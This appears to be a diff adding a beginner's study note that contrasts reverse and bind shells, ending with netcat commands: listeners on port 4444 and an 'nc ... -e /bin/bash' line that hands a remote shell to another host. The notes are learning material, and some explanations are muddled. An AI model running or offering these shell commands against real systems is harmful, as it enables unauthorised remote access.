@@ -1,0 +1,31 @@
+Reverse Vs Bind Shells
+
+Shell is Nothing but access to an machine 
+
+So basically There are two types of shells 
+1. Reverse Shell
+2. Bind Shell 
+So , lets dive in and lets find some basic differences between the two . 
+
+Reverse shell
+
+-> In this Victim Connects to us 
+-> All we going to do with the reverse shell is going to listen 
+-> we generally listen to the connection using Netcat 
+
+Bind Shell 
+
+-> In bind shell we open up a port on the target machine and then we connect to it. 
+
+-> we send an exploit the target machine and then that exploit open a port on the target machine 
+-> Then , We connect to that machine through that open port which was opened by the Exploit 
+-> Then a shell is executed on the attackers machine and we get access to the machine 
+
+
+
+-> Netcat command for listening on a port 
+	-> nc -lvp 4444
+	->nc -nlvp 4444 ( I usually prefer this one) 
+-> Netcat command to connect to a machine on a port and get a shell 
+	-> nc 192.168.x.x 4444 -e /bin/bash 
+		or you can write "sh" instead of bash 
